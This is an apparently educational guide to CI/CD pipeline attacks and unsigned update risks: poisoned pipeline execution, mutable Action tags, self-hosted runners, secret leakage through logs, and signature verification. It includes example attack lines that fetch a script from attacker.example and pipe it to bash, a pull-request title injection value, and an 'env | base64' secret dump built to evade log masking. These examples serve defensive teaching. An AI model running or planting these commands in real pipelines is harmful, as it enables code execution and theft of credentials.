# CI/CD Pipeline Security and Unsigned Update Risks

## 1. Why CI/CD pipelines are an integrity target

A CI/CD pipeline is, functionally, a privileged automation system that:

- Has credentials to internal systems (registries, cloud providers, deployment
  targets).
- Executes code pulled from a source that may include external contributors
  (pull requests, third-party Actions/plugins, fetched dependencies).
- Often runs with far more trust than a typical internet-facing application,
  because "it's internal tooling."

That combination — high privilege + executes untrusted input — is exactly the
profile of a classic remote-code-execution target, just wearing DevOps clothing
instead of a web form. The 2023 Palo Alto Networks research on the "GitHub Actions
worm" demonstrated this concretely: a single compromised Action could propagate
malicious commits across every repository that depended on it, harvesting and
exfiltrating secrets from each downstream pipeline run.

## 2. Poisoned Pipeline Execution (PPE)

PPE is the umbrella term (coined by Cider Security / now part of Palo Alto Networks
research) for any technique where an attacker gets the pipeline to execute commands
they control. It splits into two patterns:

### 2.1 Direct PPE — modifying the pipeline definition itself

If an attacker can directly modify the CI configuration file (`.github/workflows/*.yml`,
`.gitlab-ci.yml`, `Jenkinsfile`, `azure-pipelines.yml`) — for example, via a pull
request from a fork that the pipeline will run *with* elevated trust — they can
simply add a step that executes arbitrary commands.

```yaml
# Malicious addition inside a forked PR's .github/workflows/build.yml
- name: Build
  run: |
    curl -s https://attacker.example/payload.sh | bash
```

Breakdown:
- `name: Build` — disguises the malicious step under an innocuous, expected-looking
  label so it doesn't stand out in a diff review.
- `run: |` — the YAML block scalar indicator; everything indented beneath it runs as
  shell commands in the runner's default shell.
- `curl -s https://attacker.example/payload.sh` — silently (`-s` suppresses
  progress output) fetches a script from attacker infrastructure.
- `| bash` — pipes the fetched script directly into a shell for execution, with no
  integrity check on the fetched content whatsoever. This is the same fundamental
  pattern that made the CodeCov bash-uploader compromise viable — the script's
  content is never verified against any known-good hash before being executed.

The exploitability of Direct PPE hinges entirely on **whether the CI system runs
workflow changes from a pull request using the trust level (and secrets) of the base
repository, before a human has reviewed the diff.** GitHub Actions' `pull_request`
trigger, by default, runs with **read-only** permissions and no access to repository
secrets specifically to mitigate this — but `pull_request_target` does **not** have
that restriction, and is the trigger most often misused this way.

### 2.2 Indirect PPE — poisoning something the pipeline trusts and executes

This is more subtle: the attacker doesn't touch the pipeline definition at all.
Instead, they compromise something the pipeline *references and runs*:

- A build script committed to the repo (e.g. `Makefile`, `package.json` `scripts`).
- A third-party GitHub Action pinned by a mutable reference (a tag or branch name,
  not an immutable commit SHA).
- A dependency with a malicious `postinstall` hook (ties directly back to file 02).

```yaml
# Vulnerable: pinned to a mutable tag
- uses: some-org/some-action@v1
```

```yaml
# Hardened: pinned to an immutable commit SHA
- uses: some-org/some-action@8f4b7f84864484a7bf31766abe9204da3cbe65b3 # v1.2.0
```

Breakdown:
- `uses: some-org/some-action@v1` — `v1` is a **git tag**, and tags are mutable by
  default. If the action's maintainer account is compromised (the same `event-stream`
  pattern, applied to Actions instead of npm packages), the attacker can force-push a
  new commit to the `v1` tag, and every workflow referencing `@v1` will silently pull
  and execute the new, malicious code on its *next run* — with zero changes needed to
  any consuming repository's own files.
- `uses: some-org/some-action@8f4b7f8...` — pinning to a full 40-character commit SHA
  is immutable; that exact commit's content can never change underneath you. The
  trailing `# v1.2.0` comment is purely cosmetic, for human readability — it has no
  effect on what code actually runs.
- This exact distinction — tag-pinning vs SHA-pinning of third-party Actions — is
  GitHub's own top published recommendation in their Actions security hardening
  guide, written directly in response to incidents like the one described above.

### 2.3 Reconnaissance — auditing Action pinning across a repo

```bash
grep -rn "uses:" .github/workflows/ | grep -v "@[0-9a-f]\{40\}"
```

Breakdown:
- `grep -rn "uses:" .github/workflows/` — recursively (`-r`) finds every line
  referencing an Action, with line numbers (`-n`) for quick navigation.
- `grep -v "@[0-9a-f]\{40\}"` — inverts the match (`-v`), filtering **out** any line
  that already references a full 40-character hexadecimal commit SHA.
- What remains in the output is exactly the set of Actions pinned by a mutable tag
  or branch name — i.e., every line that represents an unverified, swappable
  dependency in the pipeline's trust chain.

```bash
pip install zizmor
zizmor .github/workflows/
```

Breakdown:
- `zizmor` is a static analysis tool purpose-built for auditing GitHub Actions
  workflow files. It is maintained specifically to catch the patterns described in
  this section automatically — including mutable Action pinning, dangerous trigger
  combinations (`pull_request_target` with a checkout of the PR's own untrusted
  code), and credential/secret exposure through `run:` steps or logging.
- Running it against the `.github/workflows/` directory produces a findings report
  ranked by severity, which is the standard first pass any serious CI/CD security
  review runs before manual analysis.

```bash
go install github.com/rhysd/actionlint/cmd/actionlint@latest
actionlint
```

Breakdown:
- `actionlint` focuses more on syntax correctness and common misconfiguration
  (e.g. shell injection through unescaped `${{ }}` expression interpolation directly
  into a `run:` step — a separate but closely related vulnerability class, since
  GitHub Actions expressions are textually substituted into the shell command
  *before* execution, meaning attacker-controlled values like a PR title or branch
  name can break out of their intended string context and inject arbitrary shell
  commands).

```yaml
# Vulnerable: untrusted PR title interpolated directly into a shell command
- run: echo "Building for PR: ${{ github.event.pull_request.title }}"
```

Breakdown:
- `${{ github.event.pull_request.title }}` is replaced **as raw text** into the
  YAML before the shell ever sees it — not passed as a safely-escaped argument.
  An attacker who can control a pull request's title (anyone who can open a PR
  against the repo) can set the title to something like
  `"; curl https://attacker.example/x | bash; echo "` and have it execute as a
  separate shell command once substituted in. The fix is to pass such values
  through an intermediate environment variable (`env:` block) instead of direct
  expression interpolation, since environment variables are not subject to the same
  textual-substitution-before-execution behavior.

## 3. Self-hosted runner abuse

GitHub-hosted (and equivalent GitLab/Azure SaaS) runners are ephemeral — spun up
fresh for each job and destroyed afterward. **Self-hosted runners** are not, by
default: they are often long-lived machines (or persistent containers) with network
access to internal infrastructure, sitting specifically to give a build access to
internal resources a SaaS runner couldn't reach.

The risk: if a self-hosted runner is configured to automatically pick up jobs from
**public fork pull requests** (a known GitHub anti-pattern, explicitly called out in
GitHub's own documentation as something to never do), an external, unauthenticated
attacker can submit a PR that runs arbitrary code *on that persistent, internally-
networked machine* — turning a "just open a pull request" action into a foothold for
internal lateral movement.

```bash
gh api repos/{owner}/{repo}/actions/runners
```

Breakdown:
- Using the GitHub CLI's `api` passthrough to directly query the Actions runners
  registered against a repository or organization. The relevant field to inspect in
  the response is whether runners are labeled `self-hosted` and what workflows/
  triggers are configured to target those labels — confirming whether any
  externally-triggerable workflow (especially anything on `pull_request_target` or
  unrestricted `pull_request`) is scoped to run on a self-hosted, persistently
  networked machine.

## 4. Secrets exfiltration through pipeline logs and environment dumping

Even without modifying the pipeline definition, a contributor with permission to add
*any* code that gets built/tested can often exfiltrate secrets simply by printing
them.

```bash
env | base64
```

Breakdown:
- A single line, if it can be smuggled into any test file, build script, or
  application code path the pipeline executes, dumps every environment variable
  (which in CI almost always includes injected secrets — API keys, deployment
  credentials, registry tokens) and base64-encodes the output specifically to evade
  naive secret-scanning regex that looks for recognizable plaintext key patterns in
  logs, rather than encoded blobs.
- The realistic exploitation path: this line goes inside something that looks
  legitimate — a debug print statement in a test file submitted via PR, a
  `console.log(process.env)` left in "temporarily" during a contributed bugfix — and
  the output lands in **publicly visible build logs** if the repository's Actions
  logs are public (common on open-source repos), or is at minimum visible to anyone
  with read access to CI logs internally.

Defensive note: GitHub Actions does mask values it recognizes as registered secrets
in log output, replacing them with `***`. This masking is a simple string-match
against the literal secret value — it does **not** survive any transformation. The
`base64` example above is the simplest possible bypass of that masking, since the
masked string no longer matches the literal secret text.

## 5. Unsigned/unverified software update mechanisms

This is the SolarWinds and 3CX failure mode, generalized: a software product's
auto-update mechanism fetches and installs new code with insufficient (or
no) verification of authenticity.

### 5.1 What "insufficient" looks like in practice

- Update fetched over plain HTTP (no TLS) — trivially tampered with via any
  on-path position (compromised Wi-Fi, malicious ISP, on-path attacker).
- Update fetched over HTTPS but the application never verifies a code-signing
  signature on the downloaded artifact before executing/installing it — TLS only
  proves you talked to *a* server at that domain, not that the file is legitimate
  software from the vendor (relevant if the *update server itself* is compromised,
  exactly as happened with SolarWinds' build infrastructure).
- Signature verification exists but checking is non-fatal — i.e., a failed signature
  check logs a warning but still proceeds with installation (a real anti-pattern
  found in multiple consumer IoT and desktop software audits).

### 5.2 Verifying signatures correctly — the commands that should be run

```bash
gpg --verify release.tar.gz.sig release.tar.gz
```

Breakdown:
- `gpg --verify <signature-file> <data-file>` — checks whether the detached
  signature (`.sig`) was produced by a private key whose corresponding public key is
  in your local GPG keyring, **for this exact file's contents**. Any modification to
  `release.tar.gz` — even a single byte — invalidates the signature, because GPG
  signatures are computed over a cryptographic hash of the full file content.
- Critically: this command's output must be **parsed and acted on programmatically**
  in an automated update mechanism — a `BAD signature` or `Can't check signature:
  No public key` result must halt installation. The defensive failures cited above
  (non-fatal checks) happen specifically when this verification step exists in code
  but its failure path was never wired to actually stop execution.

```bash
cosign verify-blob --key cosign.pub --signature artifact.sig artifact.tar.gz
```

Breakdown:
- `cosign verify-blob` is Sigstore's equivalent operation for arbitrary file
  artifacts (not just container images, which `cosign verify` handles).
- `--key cosign.pub` — supplies the public key to verify against (alternatively,
  keyless verification can check against a transparency log and OIDC identity
  instead of a static key file, which is increasingly the preferred Sigstore
  workflow precisely because it removes the "where do we safely store/rotate the
  public key" problem entirely).
- A successful verification confirms both the artifact's integrity (unmodified since
  signing) and its provenance (signed by the claimed identity) — directly
  operationalizing the SLSA framework's provenance requirement referenced in the
  overview file.

```bash
slsa-verifier verify-artifact artifact.tar.gz \
  --provenance-path artifact.intoto.jsonl \
  --source-uri github.com/acme/project
```

Breakdown:
- `slsa-verifier` checks a SLSA provenance attestation (the `.intoto.jsonl` file)
  against the artifact, confirming the artifact was built by the *expected* CI
  system, from the *expected* source repository, following the *expected* build
  configuration — not just "some signature checks out," but "this specific build
  pipeline, running this specific workflow file, on this specific source repo,
  produced this exact byte-for-byte artifact." This is meaningfully stronger than a
  bare signature check, because it would have caught the SolarWinds scenario where
  the signing key itself was legitimate but the *build process* producing the signed
  artifact was compromised.

### 5.3 Real-world note

Notice the throughline across sections 2 through 5: **every technique in this file is
a variation on "the pipeline/update mechanism trusted an input it should have
cryptographically verified or strictly scoped first."** That is the entire definition
of A08 applied to the build/deploy phase specifically. When you write a pentest
finding in this category, frame it that way explicitly — name the trust boundary that
was assumed instead of verified, and reference the SLSA/Sigstore/in-toto controls
above as the industry-standard remediation, not just "add a signature check," since
reviewers and clients in 2026 will expect that level of specificity.
